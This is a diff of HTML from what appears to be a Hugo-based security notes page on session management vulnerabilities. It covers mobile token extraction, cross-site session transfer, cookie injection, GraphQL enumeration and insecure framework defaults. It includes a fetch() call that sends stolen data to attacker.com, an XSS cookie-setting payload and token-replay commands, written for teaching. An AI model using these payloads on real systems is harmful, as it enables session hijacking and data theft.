+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7.</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">fixation</span> <span style="color:#a6e22e">achieved</span></span></span></code></pre></div><hr>
+<h3 id="6-mobile-app-session-persistence-attack">6. Mobile App Session Persistence Attack<a class="anchor" href="#6-mobile-app-session-persistence-attack">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Mobile app stores session tokens in insecure storage, allowing extraction from rooted/jailbroken device or backup.</p>
 <p><strong>Exploitation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Android</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Extract</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">app</span> <span style="color:#a6e22e">storage</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Android</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Extract</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">app</span> <span style="color:#a6e22e">storage</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">adb</span> <span style="color:#a6e22e">shell</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">su</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">cd</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">data</span><span style="color:#f92672">/</span><span style="color:#a6e22e">data</span><span style="color:#f92672">/</span><span style="color:#a6e22e">com</span>.<span style="color:#a6e22e">vulnerable</span>.<span style="color:#a6e22e">app</span><span style="color:#f92672">/</span><span style="color:#a6e22e">shared_prefs</span><span style="color:#f92672">/</span>
@@ -1836,55 +1708,43 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">string</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;auth_token&#34;</span>&gt;<span style="color:#a6e22e">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>...&lt;/<span style="color:#f92672">string</span>&gt;
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Use</span> <span style="color:#a6e22e">token</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">API</span> <span style="color:#a6e22e">requests</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span> <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//api.app.com/user/profile \
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Authorization: Bearer extracted_token_here&#34;</span>
-</span></span></code></pre></div><hr>
-<h3 id="7-cross-site-session-transfer">
-  7. Cross-Site Session Transfer
-  <a class="anchor" href="#7-cross-site-session-transfer">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span>  <span style="color:#f92672">-</span><span style="color:#a6e22e">H</span> <span style="color:#e6db74">&#34;Authorization: Bearer extracted_token_here&#34;</span></span></span></code></pre></div><hr>
+<h3 id="7-cross-site-session-transfer">7. Cross-Site Session Transfer<a class="anchor" href="#7-cross-site-session-transfer">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Application accepts session cookies from different origins due to misconfigured CORS or domain settings.</p>
 <p><strong>Exploitation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Attacker&#39;s page on evil.com
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://target.com/api/user&#39;</span>, {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Attacker&#39;s page on evil.com
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://target.com/api/user&#39;</span>, {
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;GET&#39;</span>,
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;include&#39;</span>,  <span style="color:#75715e">// Include cookies
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>})
 </span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">response</span> =&gt; <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">json</span>())
 </span></span><span style="display:flex;"><span>.<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">data</span> =&gt; {
 </span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Send stolen data to attacker
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://attacker.com/log&#39;</span>, {
+</span></span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://attacker.com/log&#39;</span>, {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">data</span>)
 </span></span><span style="display:flex;"><span>  });
-</span></span><span style="display:flex;"><span>});
-</span></span></code></pre></div><hr>
-<h3 id="8-session-fixation-via-cookie-injection-in-shared-hosting">
-  8. Session Fixation via Cookie Injection in Shared Hosting
-  <a class="anchor" href="#8-session-fixation-via-cookie-injection-in-shared-hosting">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>});</span></span></code></pre></div><hr>
+<h3 id="8-session-fixation-via-cookie-injection-in-shared-hosting">8. Session Fixation via Cookie Injection in Shared Hosting<a class="anchor" href="#8-session-fixation-via-cookie-injection-in-shared-hosting">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Multiple applications share same domain, attacker uses one vulnerable app to set cookies affecting other apps.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">vulnerable</span><span style="color:#f92672">-</span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span> <span style="color:#a6e22e">allows</span> <span style="color:#a6e22e">cookie</span> <span style="color:#a6e22e">injection</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">vulnerable</span><span style="color:#f92672">-</span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span> <span style="color:#a6e22e">allows</span> <span style="color:#a6e22e">cookie</span> <span style="color:#a6e22e">injection</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">secure</span><span style="color:#f92672">-</span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span> <span style="color:#a6e22e">shares</span> <span style="color:#a6e22e">domain</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">injects</span> <span style="color:#a6e22e">cookie</span> <span style="color:#a6e22e">via</span> <span style="color:#a6e22e">vulnerable</span> <span style="color:#a6e22e">app</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//vulnerable-app.example.com/xss?payload=&lt;script&gt;document.cookie=&#34;SESSION=attacker_123;domain=.example.com&#34;&lt;/script&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Cookie</span> <span style="color:#a6e22e">set</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">entire</span> .<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span> <span style="color:#a6e22e">domain</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Cookie</span> <span style="color:#a6e22e">set</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">entire</span> .<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span> <span style="color:#a6e22e">domain</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">visits</span> <span style="color:#a6e22e">secure</span><span style="color:#f92672">-</span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">example</span>.<span style="color:#a6e22e">com</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">attacker</span><span style="color:#e6db74">&#39;s session
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">6. Victim authenticates using attacker&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">pre</span><span style="color:#f92672">-</span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">session</span>
-</span></span></code></pre></div><hr>
-<h3 id="9-graphql-session-enumeration">
-  9. GraphQL Session Enumeration
-  <a class="anchor" href="#9-graphql-session-enumeration">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">6. Victim authenticates using attacker&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">pre</span><span style="color:#f92672">-</span><span style="color:#a6e22e">set</span> <span style="color:#a6e22e">session</span></span></span></code></pre></div><hr>
+<h3 id="9-graphql-session-enumeration">9. GraphQL Session Enumeration<a class="anchor" href="#9-graphql-session-enumeration">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>GraphQL API allows session enumeration through introspection or unprotected queries.</p>
 <p><strong>Exploitation:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Query</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">enumerate</span> <span style="color:#a6e22e">active</span> <span style="color:#a6e22e">sessions</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Query</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">enumerate</span> <span style="color:#a6e22e">active</span> <span style="color:#a6e22e">sessions</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">query</span> {
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sessions</span> {
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">id</span>
@@ -1904,165 +1764,116 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">name</span>
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>} 
-</span></span></code></pre></div><hr>
-<h3 id="10-session-confusion-in-multi-tenant-applications">
-  10. Session Confusion in Multi-Tenant Applications
-  <a class="anchor" href="#10-session-confusion-in-multi-tenant-applications">#</a>
-</h3>
+</span></span><span style="display:flex;"><span>} </span></span></code></pre></div><hr>
+<h3 id="10-session-confusion-in-multi-tenant-applications">10. Session Confusion in Multi-Tenant Applications<a class="anchor" href="#10-session-confusion-in-multi-tenant-applications">#</a></h3>
 <p><strong>Scenario:</strong></p>
 <p>Multi-tenant SaaS application fails to properly isolate sessions between tenants.</p>
 <p><strong>Attack Flow:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">creates</span> <span style="color:#a6e22e">account</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">Tenant</span> <span style="color:#a6e22e">A</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">creates</span> <span style="color:#a6e22e">account</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">Tenant</span> <span style="color:#a6e22e">A</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> <span style="color:#a6e22e">Obtains</span> <span style="color:#a6e22e">valid</span> <span style="color:#a6e22e">session</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SESSION_A</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xyz789</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> <span style="color:#a6e22e">Modifies</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">cookie</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">request</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SESSION_A</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xyz789</span>; <span style="color:#a6e22e">tenant_id</span><span style="color:#f92672">=</span><span style="color:#a6e22e">TENANT_B</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">processes</span> <span style="color:#a6e22e">request</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">context</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">Tenant</span> <span style="color:#a6e22e">B</span>
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">accesses</span> <span style="color:#a6e22e">Tenant</span> <span style="color:#a6e22e">B</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">using</span> <span style="color:#a6e22e">Tenant</span> <span style="color:#a6e22e">A</span> <span style="color:#a6e22e">session</span>
-</span></span></code></pre></div><h2 id="framework-specific-vulnerabilities">
-  Framework-Specific Vulnerabilities
-  <a class="anchor" href="#framework-specific-vulnerabilities">#</a>
-</h2>
-<h3 id="1-php-session-management">
-  1. PHP Session Management
-  <a class="anchor" href="#1-php-session-management">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5.</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">accesses</span> <span style="color:#a6e22e">Tenant</span> <span style="color:#a6e22e">B</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">using</span> <span style="color:#a6e22e">Tenant</span> <span style="color:#a6e22e">A</span> <span style="color:#a6e22e">session</span></span></span></code></pre></div><h2 id="framework-specific-vulnerabilities">Framework-Specific Vulnerabilities<a class="anchor" href="#framework-specific-vulnerabilities">#</a></h2>
+<h3 id="1-php-session-management">1. PHP Session Management<a class="anchor" href="#1-php-session-management">#</a></h3>
 <p><strong>Default session.cookie_httponly = false:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable - cookies accessible via JavaScript
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">session_start</span>();
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable - cookies accessible via JavaScript
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">$_SESSION</span>[<span style="color:#e6db74">&#39;user_id&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">$user_id</span>;
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// XSS can steal session
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(document.<span style="color:#a6e22e">cookie</span>)&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><p><strong>Session ID in URL:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable - exposes session in URL
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;session.use_trans_sid&#39;</span>, <span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// Results in: page.php?PHPSESSID=abc123
-</span></span></span></code></pre></div><hr>
-<h3 id="2-javajsp-sessions">
-  2. Java/JSP Sessions
-  <a class="anchor" href="#2-javajsp-sessions">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(document.<span style="color:#a6e22e">cookie</span>)&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><p><strong>Session ID in URL:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable - exposes session in URL
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;session.use_trans_sid&#39;</span>, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// Results in: page.php?PHPSESSID=abc123</span></span></span></code></pre></div><hr>
+<h3 id="2-javajsp-sessions">2. Java/JSP Sessions<a class="anchor" href="#2-javajsp-sessions">#</a></h3>
 <p><strong>Session fixation if not regenerated:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable - doesn&#39;t regenerate session after login
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">HttpSession</span> <span style="color:#a6e22e">session</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">getSession</span>();
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable - doesn&#39;t regenerate session after login
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">HttpSession</span> <span style="color:#a6e22e">session</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">getSession</span>();
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">setAttribute</span>(<span style="color:#e6db74">&#34;user&#34;</span>, <span style="color:#a6e22e">authenticatedUser</span>);
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// Should invalidate old session and create new one
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">invalidate</span>();
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HttpSession</span> <span style="color:#a6e22e">newSession</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">getSession</span>(<span style="color:#66d9ef">true</span>);
-</span></span></code></pre></div><hr>
-<h3 id="3-nodejsexpress-sessions">
-  3. Node.js/Express Sessions
-  <a class="anchor" href="#3-nodejsexpress-sessions">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">invalidate</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">HttpSession</span> <span style="color:#a6e22e">newSession</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">getSession</span>(<span style="color:#66d9ef">true</span>);</span></span></code></pre></div><hr>
+<h3 id="3-nodejsexpress-sessions">3. Node.js/Express Sessions<a class="anchor" href="#3-nodejsexpress-sessions">#</a></h3>
 <p><strong>Insecure session defaults:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable - weak secret, no secure flag
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">session</span>({
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable - weak secret, no secure flag
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">session</span>({
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">secret</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;keyboard cat&#39;</span>,
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">resave</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">saveUninitialized</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">cookie</span><span style="color:#f92672">:</span> { <span style="color:#a6e22e">secure</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span> }  <span style="color:#75715e">// Allows HTTP transmission
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}));
-</span></span></code></pre></div><hr>
-<h3 id="4-django-sessions">
-  4. Django Sessions
-  <a class="anchor" href="#4-django-sessions">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span>}));</span></span></code></pre></div><hr>
+<h3 id="4-django-sessions">4. Django Sessions<a class="anchor" href="#4-django-sessions">#</a></h3>
 <p><strong>Session data stored in cookies without signing:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">settings</span>.<span style="color:#a6e22e">py</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Vulnerable</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">settings</span>.<span style="color:#a6e22e">py</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">Vulnerable</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">SESSION_ENGINE</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;django.contrib.sessions.backends.signed_cookies&#39;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">SECRET_KEY</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;weak_secret&#39;</span>  <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Weak</span> <span style="color:#a6e22e">secret</span> <span style="color:#a6e22e">allows</span> <span style="color:#a6e22e">tampering</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">decode</span>, <span style="color:#a6e22e">modify</span>, <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">re</span><span style="color:#f92672">-</span><span style="color:#a6e22e">encode</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">data</span>
-</span></span></code></pre></div><hr>
-<h3 id="5-ruby-on-rails">
-  5. Ruby on Rails
-  <a class="anchor" href="#5-ruby-on-rails">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">decode</span>, <span style="color:#a6e22e">modify</span>, <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">re</span><span style="color:#f92672">-</span><span style="color:#a6e22e">encode</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">data</span></span></span></code></pre></div><hr>
+<h3 id="5-ruby-on-rails">5. Ruby on Rails<a class="anchor" href="#5-ruby-on-rails">#</a></h3>
 <p><strong>Session secret exposed in repository:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">config</span><span style="color:#f92672">/</span><span style="color:#a6e22e">secrets</span>.<span style="color:#a6e22e">yml</span> <span style="color:#a6e22e">committed</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">Git</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">config</span><span style="color:#f92672">/</span><span style="color:#a6e22e">secrets</span>.<span style="color:#a6e22e">yml</span> <span style="color:#a6e22e">committed</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">Git</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">production</span><span style="color:#f92672">:</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">secret_key_base</span><span style="color:#f92672">:</span> <span style="color:#f92672">&lt;%=</span> <span style="color:#a6e22e">ENV</span>[<span style="color:#e6db74">&#34;SECRET_KEY_BASE&#34;</span>] <span style="color:#f92672">%&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">If</span> <span style="color:#a6e22e">secret</span> <span style="color:#a6e22e">leaked</span>, <span style="color:#a6e22e">attacker</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">forge</span> <span style="color:#a6e22e">sessions</span>
-</span></span></code></pre></div><hr>
-<h3 id="6-aspnet">
-  6. ASP.NET
-  <a class="anchor" href="#6-aspnet">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">If</span> <span style="color:#a6e22e">secret</span> <span style="color:#a6e22e">leaked</span>, <span style="color:#a6e22e">attacker</span> <span style="color:#a6e22e">can</span> <span style="color:#a6e22e">forge</span> <span style="color:#a6e22e">sessions</span></span></span></code></pre></div><hr>
+<h3 id="6-aspnet">6. ASP.NET<a class="anchor" href="#6-aspnet">#</a></h3>
 <p><strong>Missing session timeout configuration:</strong></p>
